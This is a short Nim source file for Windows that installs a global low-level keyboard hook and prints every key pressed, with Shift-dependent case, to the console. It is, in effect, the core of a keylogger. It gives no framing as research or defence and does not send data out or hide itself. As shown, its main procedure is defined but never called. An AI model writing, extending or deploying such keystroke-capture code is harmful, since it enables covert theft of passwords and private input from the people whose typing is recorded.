import winim
import std/strutils

var
  hook*: HHOOK # hook handle
  kbdStruct*: KBDLLHOOKSTRUCT # contains keycode etc
  msg: MSG

proc HookCallback*(nCode: cint; wParam: WPARAM; lParam: LPARAM): LRESULT {.stdcall.} =
  if nCode >= 0 and wParam == WM_KEYDOWN:
      kbdStruct = (cast[ptr KBDLLHOOKSTRUCT](lParam))[]
      var pressed: ptr int = cast[ptr int](addr(kbdStruct))
      var shiftPressed: bool = (GetAsyncKeyState(VK_SHIFT) != 0)
      if pressed[] != VK_SHIFT:
        var keyPressed = if shiftPressed: cast[ptr char](pressed)[] else: cast[ptr char](pressed)[].toLowerAscii()
        echo keyPressed
  return CallNextHookEx(hook, nCode, wParam, lParam)

proc main*(): cint =
  var hook = SetWindowsHookEx(WH_KEYBOARD_LL, cast[HOOKPROC](HookCallback), 0, 0)
  if bool(hook):
    while GetMessage(addr(msg), 0, 0, 0): discard # get message events like key inputs
    return 0
  return 1
